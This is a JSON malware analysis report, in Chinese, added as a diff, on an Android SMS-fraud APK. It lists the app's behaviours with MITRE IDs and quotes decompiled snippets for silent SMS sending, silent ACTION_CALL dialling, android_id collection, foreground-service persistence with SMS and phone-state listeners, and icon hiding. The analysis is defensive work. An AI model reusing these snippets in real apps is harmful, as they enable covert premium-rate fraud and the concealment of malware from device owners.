@@ -1,0 +1,183 @@
+{
+  "APK信息": {
+    "文件名": "5937de4596fda94e321fa80ad6ecafc93f55af3141662ac24e4dd52497ef6191.apk",
+    "sha256": "5937de4596fda94e321fa80ad6ecafc93f55af3141662ac24e4dd52497ef6191",
+    "包名": "com.pledge.factor",
+    "应用名": "СМC - Пoсланиe",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 158.2
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\pledge\\factor\\c;",
+          "method_signature": "a(String str, String str2, PendingIntent pendingIntent)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);",
+          "malicious_code_snippet_context": "          a.a(\"\".toString() + \"\");\n          try {\n              Observer.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n          } catch (Exception e) {\n          }\n      }",
+          "behavior_description": "代码通过SmsManager.getDefault().sendTextMessage()静默发送短信到指定号码，无需用户交互。辅助方法a(Context)检查SDK版本是否<19或当前应用是否为默认短信应用，用于判断是否可绕过Android 4.4+的短信发送限制。数据流向：方法参数str(目标号码)和str2(短信内容)→SmsManager.sendTextMessage()静默发送短信",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "ANDROID_ID"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\pledge\\factor\\c;",
+          "method_signature": "e(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String e(Context context) {\n    return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n}",
+          "malicious_code_snippet_context": "          return false;\n      }\n  \n>>>     public static String e(Context context) {\n>>>         return Settings.Secure.getString(context.getContentResolver(), \"android_id\");\n>>>     }\n  }",
+          "behavior_description": "该方法通过 Settings.Secure.getString 获取设备的 android_id 标识符并返回。android_id 是一种设备唯一标识符，在恶意样本中通常被用于设备指纹采集，以便追踪用户或建立设备画像。数据流向为：Settings.Secure（数据来源）→ 方法返回值（可能被调用方收集并上传至C2服务器）。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\pledge\\factor\\ConvictionBoy;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Intent intent = new Intent(getApplicationContext(), TemporaryCoup.class);\nif (Build.VERSION.SDK_INT >= 26) {\n    startForegroundService(intent);\n} else {\n    startService(intent);\n}\nintentFilter.addAction(\"android.provider.Telephony.SMS_RECEIVED\");\nintentFilter.addAction(\"android.intent.action.PHONE_STATE\");",
+          "malicious_code_snippet_context": "                  System.exit(1);\n              }\n          });\n>>>         Intent intent = new Intent(getApplicationContext(), (Class<?>) TemporaryCoup.class);\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             startForegroundService(intent);\n>>>         } else {\n>>>             startService(intent);\n>>>         }\n>>>         HandlerThread handlerThread = new HandlerThread(\"Economic\");\n>>>         handlerThread.start();\n          a = new Handler(handlerThread.getLooper());\n          IntentFilter intentFilter = new IntentFilter();\n          intentFilter.addAction(\"android.provider.Telephony.SMS_RECEIVED\");",
+          "behavior_description": "应用在 onCreate 中通过 startForegroundService 启动 TemporaryCoup 前台服务实现持久保活，同时注册 SMS_RECEIVED 和 PHONE_STATE 广播监听器用于拦截短信和监听来电状态。设置 UncaughtExceptionHandler 在崩溃时直接 System.exit(1) 以避免崩溃报告暴露行为。结合恶意样本背景，此保活机制为后续短信拦截/验证码窃取提供持续运行保障，属于银行木马/短信欺诈类恶意行为的持久化组件。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "call_operations",
+      "中文名": "通话操作",
+      "MITRE": "",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "call_phone",
+          "中文名": "拨打电话",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.CALL_PHONE"
+            ],
+            "字符串": [
+              "android.intent.action.CALL"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\pledge\\factor\\SweetAngle;",
+          "method_signature": "b(Context context, String str)",
+          "malicious_behavior": "call_operations",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "Uri parse = Uri.parse(\"tel:\" + str);\nIntent intent = new Intent(\"android.intent.action.CALL\", parse);\nintent.addFlags(268435456);\ncontext.startActivity(intent);",
+          "malicious_code_snippet_context": "          a.a(\"\".toString() + \"\");\n          try {\n              Observer.a(true);\n>>>             Uri parse = Uri.parse(\"tel:\" + str);\n>>>             a.a(\"\".toString() + \"\");\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\", parse);\n>>>             intent.addFlags(268435456);\n              context.startActivity(intent);\n              return 0;\n          } catch (Exception e) {",
+          "behavior_description": "该方法接收外部传入的电话号码字符串str，构造tel: Uri并创建ACTION_CALL意图，直接发起电话呼叫。与ACTION_DIAL不同，ACTION_CALL无需用户交互即可直接拨出电话，属于静默拨号行为。在恶意样本中，攻击者可通过C2指令控制拨打的号码（如高额费率号码），导致用户产生直接经济损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\pledge\\factor\\ConvictionBoy;",
+          "method_signature": "if(Build.VERSION.SDK_INT >= 26)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Chimpanzee.class), 2, 1);",
+          "malicious_code_snippet_context": "          this.b.acquire();\n          c.b(getApplicationContext());\n          a.post(this.c);\n>>>         getPackageManager().setComponentEnabledSetting(new ComponentName(getApplicationContext(), (Class<?>) Chimpanzee.class), 2, 1);\n      }\n  }",
+          "behavior_description": "代码调用 setComponentEnabledSetting 将 Chimpanzee 组件（通常为应用主 Activity/Launcher Activity）的启用状态设置为 COMPONENT_ENABLED_STATE_DISABLED(=2)，使用 DONT_KILL_APP(=1) 标志，从而在桌面隐藏应用图标。同时上下文中还注册了 SMS_RECEIVED 和 PHONE_STATE 广播接收器并获取 WakeLock 保活，表明该样本在隐藏图标后持续在后台监听短信和电话状态，是典型的恶意软件逃避用户察觉的手段。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
